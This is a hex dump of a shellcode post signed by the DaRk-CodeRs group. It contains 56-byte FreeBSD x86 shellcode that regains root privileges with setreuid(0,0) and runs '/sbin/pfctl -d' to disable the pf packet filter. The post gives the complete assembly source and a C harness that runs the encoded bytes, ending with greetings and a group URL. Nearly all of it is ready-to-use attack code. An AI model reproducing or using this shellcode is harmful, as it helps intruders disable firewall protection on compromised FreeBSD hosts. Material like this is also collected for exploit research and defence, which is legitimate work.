00000000  2a 2a 2a 28 43 29 6f 44  65 64 20 62 59 20 73 75  |***(C)oDed bY su|
00000010  4e 38 48 63 6c 66 2a 2a  2a 0d 0a 20 20 20 20 20  |N8Hclf***..     |
00000020  20 20 20 20 20 20 20 20  20 20 44 61 52 6b 2d 43  |          DaRk-C|
00000030  6f 64 65 52 73 20 47 72  6f 75 70 20 70 72 6f 64  |odeRs Group prod|
00000040  75 63 74 69 6f 6e 2c 20  6b 69 64 0d 0a 20 20 20  |uction, kid..   |
00000050  20 20 5b 46 72 65 65 42  53 44 20 78 38 36 20 73  |  [FreeBSD x86 s|
00000060  65 74 72 65 75 69 64 28  30 2c 20 30 29 20 2b 20  |etreuid(0, 0) + |
00000070  65 78 65 63 76 65 28 70  66 63 74 6c 20 2d 64 29  |execve(pfctl -d)|
00000080  20 35 36 20 62 79 74 65  73 5d 0d 0a 0d 0a 54 68  | 56 bytes]....Th|
00000090  65 20 73 69 6d 70 6c 65  73 20 77 61 79 20 74 6f  |e simples way to|
000000a0  20 64 69 73 61 62 6c 65  20 74 68 65 20 46 72 65  | disable the Fre|
000000b0  65 42 53 44 27 73 20 70  61 63 6b 65 74 20 66 69  |eBSD's packet fi|
000000c0  6c 74 65 72 2e 20 57 65  20 64 6f 20 6e 6f 74 0d  |lter. We do not.|
000000d0  0a 66 6c 75 73 68 20 61  6c 6c 20 72 75 6c 65 73  |.flush all rules|
000000e0  20 28 70 66 63 74 6c 20  2d 46 20 61 6c 6c 29 20  | (pfctl -F all) |
000000f0  62 75 74 20 6f 6e 6c 79  20 74 75 72 6e 20 74 68  |but only turn th|
00000100  65 20 66 69 72 65 77 61  6c 6c 20 6f 66 66 2e 0d  |e firewall off..|
00000110  0a 0d 0a 41 73 73 65 6d  62 6c 79 20 63 6f 64 65  |...Assembly code|
00000120  3a 0d 0a 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |:..-------------|
00000130  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 63 6f 64 65  |------------code|
00000140  2e 61 73 6d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |.asm------------|
00000150  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0d 0a  |--------------..|
00000160  73 65 63 74 69 6f 6e 20  2e 74 65 78 74 0d 0a 67  |section .text..g|
00000170  6c 6f 62 61 6c 20 5f 73  74 61 72 74 0d 0a 0d 0a  |lobal _start....|
00000180  5f 73 74 61 72 74 3a 0d  0a 0d 0a 09 78 6f 72 20  |_start:.....xor |
00000190  65 61 78 2c 20 65 61 78  0d 0a 09 70 75 73 68 20  |eax, eax...push |
000001a0  65 61 78 0d 0a 09 70 75  73 68 20 65 61 78 0d 0a  |eax...push eax..|
000001b0  09 6d 6f 76 20 61 6c 2c  20 31 32 36 0d 0a 09 70  |.mov al, 126...p|
000001c0  75 73 68 20 65 61 78 0d  0a 09 69 6e 74 20 30 78  |ush eax...int 0x|
000001d0  38 30 20 20 20 20 20 20  20 20 20 20 20 3b 20 73  |80           ; s|
000001e0  65 74 72 65 75 69 64 28  29 0d 0a 0d 0a 09 78 6f  |etreuid().....xo|
000001f0  72 20 65 61 78 2c 20 65  61 78 0d 0a 09 70 75 73  |r eax, eax...pus|
00000200  68 20 65 61 78 0d 0a 09  70 75 73 68 20 77 6f 72  |h eax...push wor|
00000210  64 20 30 78 36 34 32 64  0d 0a 09 6d 6f 76 20 65  |d 0x642d...mov e|
00000220  63 78 2c 20 65 73 70 20  20 20 20 20 20 20 3b 20  |cx, esp       ; |
00000230  65 63 78 20 63 6f 6e 74  61 69 6e 73 20 61 20 70  |ecx contains a p|
00000240  6f 69 6e 74 65 72 20 74  6f 20 22 2d 64 22 20 73  |ointer to "-d" s|
00000250  74 72 69 6e 67 0d 0a 0d  0a 09 70 75 73 68 20 65  |tring.....push e|
00000260  61 78 20 0d 0a 09 70 75  73 68 20 30 78 36 63 37  |ax ...push 0x6c7|
00000270  34 36 33 36 36 0d 0a 09  70 75 73 68 20 30 78 37  |46366...push 0x7|
00000280  30 32 66 36 65 36 39 0d  0a 09 70 75 73 68 20 30  |02f6e69...push 0|
00000290  78 36 32 37 33 32 66 32  66 0d 0a 09 6d 6f 76 20  |x62732f2f...mov |
000002a0  65 62 78 2c 20 65 73 70  20 20 20 20 20 20 20 3b  |ebx, esp       ;|
000002b0  20 65 62 78 20 63 6f 6e  74 61 69 6e 73 20 61 20  | ebx contains a |
000002c0  70 6f 69 6e 74 65 72 20  74 6f 20 22 2f 2f 73 62  |pointer to "//sb|
000002d0  69 6e 2f 70 66 63 74 6c  22 20 73 74 72 69 6e 67  |in/pfctl" string|
000002e0  0d 0a 0d 0a 09 70 75 73  68 20 65 61 78 0d 0a 09  |.....push eax...|
000002f0  70 75 73 68 20 65 63 78  0d 0a 09 70 75 73 68 20  |push ecx...push |
00000300  65 62 78 0d 0a 09 6d 6f  76 20 65 63 78 2c 20 65  |ebx...mov ecx, e|
00000310  73 70 0d 0a 0d 0a 09 70  75 73 68 20 65 61 78 0d  |sp.....push eax.|
00000320  0a 09 70 75 73 68 20 65  63 78 0d 0a 09 70 75 73  |..push ecx...pus|
00000330  68 20 65 62 78 0d 0a 09  6d 6f 76 20 61 6c 2c 20  |h ebx...mov al, |
00000340  30 78 33 62 0d 0a 09 70  75 73 68 20 65 61 78 0d  |0x3b...push eax.|
00000350  0a 09 69 6e 74 20 30 78  38 30 20 20 20 20 20 20  |..int 0x80      |
00000360  20 20 20 20 3b 20 65 78  65 63 76 65 28 29 0d 0a  |    ; execve()..|
00000370  0d 0a 09 78 6f 72 20 65  61 78 2c 20 65 61 78 0d  |...xor eax, eax.|
00000380  0a 09 70 75 73 68 20 65  61 78 0d 0a 09 70 75 73  |..push eax...pus|
00000390  68 20 65 61 78 0d 0a 09  69 6e 74 20 30 78 38 30  |h eax...int 0x80|
000003a0  20 20 20 20 20 20 20 20  20 20 3b 20 65 78 69 74  |          ; exit|
000003b0  28 29 0d 0a 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |()..------------|
000003c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 63 6f 64  |-------------cod|
000003d0  65 2e 61 73 6d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |e.asm-----------|
000003e0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 0d  |---------------.|
000003f0  0a 41 6e 64 20 43 20 63  6f 64 65 3a 0d 0a 2d 2d  |.And C code:..--|
00000400  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000410  2d 2d 2d 2d 2d 2d 2d 63  6f 64 65 2e 63 2d 2d 2d  |-------code.c---|
00000420  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000430  2d 2d 2d 2d 2d 2d 2d 2d  2d 0d 0a 23 69 6e 63 6c  |---------..#incl|
00000440  75 64 65 20 22 73 74 64  69 6f 2e 68 22 0d 0a 0d  |ude "stdio.h"...|
00000450  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
00000460  5d 3d 0d 0a 22 5c 78 33  31 5c 78 63 30 5c 78 35  |]=.."\x31\xc0\x5|
00000470  30 5c 78 35 30 5c 78 62  30 5c 78 37 65 5c 78 35  |0\x50\xb0\x7e\x5|
00000480  30 5c 78 63 64 5c 78 38  30 5c 78 33 31 5c 78 63  |0\xcd\x80\x31\xc|
00000490  30 5c 78 35 30 5c 78 36  36 5c 78 36 38 5c 78 32  |0\x50\x66\x68\x2|
000004a0  64 5c 78 36 34 22 20 0d  0a 22 5c 78 38 39 5c 78  |d\x64" .."\x89\x|
000004b0  65 31 5c 78 35 30 5c 78  36 38 5c 78 36 36 5c 78  |e1\x50\x68\x66\x|
000004c0  36 33 5c 78 37 34 5c 78  36 63 5c 78 36 38 5c 78  |63\x74\x6c\x68\x|
000004d0  36 39 5c 78 36 65 5c 78  32 66 5c 78 37 30 5c 78  |69\x6e\x2f\x70\x|
000004e0  36 38 5c 78 32 66 5c 78  32 66 22 0d 0a 22 5c 78  |68\x2f\x2f".."\x|
000004f0  37 33 5c 78 36 32 5c 78  38 39 5c 78 65 33 5c 78  |73\x62\x89\xe3\x|
00000500  35 30 5c 78 35 31 5c 78  35 33 5c 78 38 39 5c 78  |50\x51\x53\x89\x|
00000510  65 31 5c 78 35 30 5c 78  35 31 5c 78 35 33 5c 78  |e1\x50\x51\x53\x|
00000520  62 30 5c 78 33 62 5c 78  35 30 5c 78 63 64 22 0d  |b0\x3b\x50\xcd".|
00000530  0a 22 5c 78 38 30 5c 78  33 31 5c 78 63 30 5c 78  |."\x80\x31\xc0\x|
00000540  35 30 5c 78 35 30 5c 78  63 64 5c 78 38 30 22 3b  |50\x50\xcd\x80";|
00000550  0d 0a 0d 0a 69 6e 74 20  6d 61 69 6e 28 69 6e 74  |....int main(int|
00000560  20 61 72 67 63 2c 20 63  68 61 72 20 2a 61 72 67  | argc, char *arg|
00000570  76 5b 5d 29 7b 0d 0a 09  69 6e 74 20 28 2a 66 75  |v[]){...int (*fu|
00000580  6e 63 29 28 29 3b 0d 0a  09 66 75 6e 63 3d 28 69  |nc)();...func=(i|
00000590  6e 74 20 28 2a 29 28 29  29 73 68 65 6c 6c 63 6f  |nt (*)())shellco|
000005a0  64 65 3b 0d 0a 09 28 69  6e 74 29 28 2a 66 75 6e  |de;...(int)(*fun|
000005b0  63 29 28 29 3b 0d 0a 7d  0d 0a 2d 2d 2d 2d 2d 2d  |c)();..}..------|
000005c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000005d0  2d 2d 2d 63 6f 64 65 2e  63 2d 2d 2d 2d 2d 2d 2d  |---code.c-------|
000005e0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000005f0  2d 2d 2d 2d 2d 0d 0a 0d  0a 47 72 65 65 74 7a 20  |-----....Greetz |
00000600  74 6f 3a 20 30 69 6e 2c  20 63 4f 6e 64 65 6d 6e  |to: 0in, cOndemn|
00000610  65 64 20 28 61 6e 64 20  74 6f 20 6f 74 68 65 72  |ed (and to other|
00000620  20 44 61 52 6b 2d 43 6f  64 65 52 73 20 6d 65 6d  | DaRk-CodeRs mem|
00000630  62 65 72 73 29 2c 20 73  74 72 30 6b 65 2c 20 65  |bers), str0ke, e|
00000640  2e 77 69 5a 7a 21 2c 20  0d 0a 20 20 20 20 20 20  |.wiZz!, ..      |
00000650  20 20 20 20 20 4b 61 74  68 61 72 73 69 73 2c 20  |     Katharsis, |
00000660  64 6f 63 74 6f 72 20 61  6e 64 20 6d 61 6e 79 20  |doctor and many |
00000670  6f 74 68 65 72 73 2e 2e  2e 0d 0a 56 69 73 69 74  |others.....Visit|
00000680  20 75 73 20 3a 20 77 77  77 2e 64 61 72 6b 2d 63  | us : www.dark-c|
00000690  6f 64 65 72 73 2e 70 6c                           |oders.pl|
00000698
